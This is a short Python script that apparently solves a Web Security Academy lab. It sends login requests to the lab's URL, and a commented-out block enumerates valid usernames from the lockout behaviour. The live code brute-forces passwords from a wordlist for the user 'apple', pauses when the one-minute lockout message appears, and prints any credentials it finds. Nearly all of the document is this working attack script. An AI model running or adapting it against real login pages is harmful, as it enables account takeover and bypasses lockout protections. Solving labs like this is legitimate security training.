import requests
from time import sleep

url = "https://0a9800ea031a3852829301cf00ad0083.web-security-academy.net/login"

usernames = open("usernames.txt", "r").readlines()
passwords = open("passwords.txt", "r").readlines()

"""
valid_usernames = []

for username in usernames:
    print(f"Trying {username.strip()}")
    data = {
        "username" : username.strip(),
        "password" : "AA"
    }
    for i in range(5):
        content = requests.post(url, data).content
        if(not b"Invalid username or password." in content):
            valid_usernames.append(username.strip())
            break
"""

username = "apple" #valid_usernames[0].strip()

for password in passwords:
    data = {
        "username" : username,
        "password" : password.strip()
    }
    content = requests.post(url, data).content
    if(not b"Invalid username or password." in content):
        if(b"1 minute(s)" in content):
            sleep(60)
        else:
            print(f"Creds ==> {username}/{password.strip()}")
            break